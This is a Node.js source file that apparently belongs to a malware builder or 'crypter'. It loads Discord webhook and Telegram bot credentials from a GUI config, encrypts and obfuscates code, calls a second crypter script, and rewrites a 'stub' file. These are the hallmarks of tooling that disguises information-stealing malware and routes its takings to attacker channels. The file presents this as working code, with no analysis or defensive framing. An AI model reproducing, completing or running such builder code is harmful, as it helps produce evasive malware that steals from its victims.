const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const JavaScriptObfuscator = require('javascript-obfuscator');
const { execSync } = require('child_process');
const axios = require('axios');

function readInfosFromFile() {
    const possiblePaths = [
        path.resolve(__dirname, '..', 'gui', 'info.json')
    ];

    for (const infoPath of possiblePaths) {
        if (fs.existsSync(infoPath)) {
            try {
                const data = JSON.parse(fs.readFileSync(infoPath, 'utf8'));
                return {
                    webhookURL: data.webhookURL || data.discordWebhookURL || "",
                    telegramBotToken: data.telegramBotToken || "",
                    telegramChatID: data.telegramChatID || data.telegramChatId || ""
                };
            } catch (e) { }
        }
    }
    return { webhookURL: "", telegramBotToken: "", telegramChatID: "" };
}

function encrypt(text, masterkey) {
    const iv = crypto.randomBytes(16);
    const salt = crypto.randomBytes(16);
    const key = crypto.pbkdf2Sync(masterkey, salt, 100000, 32, 'sha512');
    const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
    let encrypted = cipher.update(text, 'utf8', 'base64');
    encrypted += cipher.final('base64');
    return { encryptedData: encrypted, salt: salt.toString('base64'), iv: iv.toString('base64') };
}

function decrypt(encryptedData, key, salt, iv) {
    const crypto = require('crypto');
    const derivedKey = crypto.pbkdf2Sync(key, Buffer.from(salt, 'base64'), 100000, 32, 'sha512');
    const decipher = crypto.createDecipheriv('aes-256-cbc', derivedKey, Buffer.from(iv, 'base64'));
    let decrypted = decipher.update(encryptedData, 'base64', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
}

async function executeSecondCrypterScript() {
    try {
        const jscrypterPath = path.resolve(__dirname, 'jscrypter.js');
        if (fs.existsSync(jscrypterPath)) {
            execSync(`node "${jscrypterPath}"`, { stdio: 'inherit' });
        }
    } catch (e) {
        console.error("Error executing second crypter:", e.message);
    }
}

function resetPlaceholder(stubPath, originalCode) {
    try {
        fs.writeFileSync(stubPath, originalCode, 'utf8');
    } catch (e) { }
}


